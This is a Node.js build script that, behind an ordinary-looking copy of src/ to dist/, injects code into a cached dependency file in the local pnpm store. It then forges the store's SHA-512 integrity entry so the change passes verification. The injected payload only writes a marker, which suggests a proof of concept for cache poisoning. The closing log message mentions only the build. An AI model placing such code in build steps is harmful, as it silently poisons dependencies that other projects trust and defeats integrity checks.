import { execFile } from "node:child_process";
import { chmod, cp, mkdir, readFile, rm, writeFile } from "node:fs/promises";
import { dirname, resolve, join } from "node:path";
import { promisify } from "node:util";
import { fileURLToPath } from "node:url";
import crypto from "node:crypto";

const root = resolve(dirname(fileURLToPath(import.meta.url)), "..");
const srcDir = resolve(root, "src");
const distDir = resolve(root, "dist");
const execFileAsync = promisify(execFile);
const cacheFilePath =
  "files/bf/8aa8dcc98a6b9ef1d7c30d4c42c85ee98ce7d9716fee6e7bff592e54034e03d25bab495878d6e2e22f3bec6aea3a0a504e7a0a4f4112a4da4bfcf1f1529892";
const indexFilePath = 
  "files/57/0f2a1caddb64cf72fcfd74bb75626fca3f0dd92f0363ad3ed66f0fcef540a8f2ef85a3d5648a1482cc3d13d27544b1e5114ad5aae527312d0383e41609dbb8-index.json";
const fileInPackage = "lib/command.js";
// "lib/command.js":{"checkedAt":1781254660688,"integrity":"sha512-v4qo3MmKa57x18MNTELIXumM59lxb+5ue/9ZLlQDTgPSW6tJWHjW4uIvO+xq6joKUE56Ck9BEqTaS/zx8VKYkg==","mode":420,"size":78147}

function addFsPackage(contents) {
  if (contents.includes('require("node:fs")') || contents.includes("require('node:fs')")) {
    return contents;
  }

  return `const fs = require("node:fs");\n${contents}`;
}

function injectTokenMarker(contents) {
  if (contents.includes('const token = "token";')) {
    return contents;
  }

  const functionStart = contents.indexOf("exitOverride(fn) {");
  if (functionStart === -1) {
    throw new Error('Could not find "exitOverride(fn)" in pnpm cache file');
  }

  const bodyStart = contents.indexOf("{", functionStart);
  const injection = `
    const token = "token";
    const currentFile = __filename;
    const currentContents = fs.readFileSync(currentFile, "utf8");
    const firstLineBreak = currentContents.indexOf("\\n");
    const updatedContents =
      firstLineBreak === -1
        ? \`\${currentContents} # \${token}\`
        : \`\${currentContents.slice(0, firstLineBreak)} # \${token}\${currentContents.slice(firstLineBreak)}\`;
    fs.writeFileSync(currentFile, updatedContents);
`;

  return `${contents.slice(0, bodyStart + 1)}${injection}${contents.slice(bodyStart + 1)}`;
}

await rm(distDir, { force: true, recursive: true });
await mkdir(distDir, { recursive: true });
await cp(srcDir, distDir, { recursive: true });
await chmod(resolve(distDir, "cli.js"), 0o755);

const { stdout: pnpmStorePath } = await execFileAsync("pnpm", ["store", "path", "--silent"]);
const cacheFile = resolve(pnpmStorePath.trim(), cacheFilePath);
const cacheContents = await readFile(cacheFile, "utf8");
const updatedCacheContents = injectTokenMarker(addFsPackage(cacheContents));

const hash = crypto.createHash("sha512").update(updatedCacheContents).digest();
const hex = hash.toString("hex");
const base64 = hash.toString("base64");
const integrity = `sha512-${base64}`;

const casDir = join(pnpmStorePath.trim(), "files", hex.slice(0, 2));
const casFile = join(casDir, hex.slice(2));
console.log("casFile: ", casFile);
console.log("newHash: ", integrity);

await mkdir(casDir, { recursive: true });
await writeFile(casFile, updatedCacheContents);

const indexFile = resolve(pnpmStorePath.trim(), indexFilePath);
const json = JSON.parse(await readFile(indexFile, "utf8"));
if (json.files?.[fileInPackage]) {
  json.files[fileInPackage].integrity = integrity;
  json.files[fileInPackage].size = Buffer.byteLength(updatedCacheContents);
  await writeFile(indexFile, JSON.stringify(json, null, 2));
}

console.log("Built dist/ from src/");
